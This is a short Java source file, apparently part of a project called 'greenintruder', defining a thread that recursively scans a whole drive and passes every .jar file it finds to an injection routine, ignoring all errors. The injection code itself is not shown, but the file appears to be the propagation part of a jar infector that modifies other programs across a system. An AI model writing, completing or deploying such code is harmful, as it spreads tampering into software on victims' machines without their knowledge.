package io.github.explodingbottle.greenintruder.certifier.admintools;

import java.io.File;
import java.nio.file.Path;

public class InjectionThread extends Thread {
	private File drive;

	public InjectionThread(File drive) {
		this.drive = drive;
	}

	private void recursive(Path path) {
		File[] fileList = path.toFile().listFiles();
		if (fileList != null) {
			for (File file : fileList) {
				Path pathVal = file.toPath();
				if (file.isDirectory()) {
					recursive(pathVal);
				} else {

					if (pathVal.toFile().getName().toLowerCase().endsWith(".jar")) {
						InjectionTool.injectInJar(pathVal.toFile());

					} else {

					}

				}
			}
		}
	}

	public void run() {
		try {
			recursive(drive.toPath());
		} catch (Exception e) {

		}

	}

}
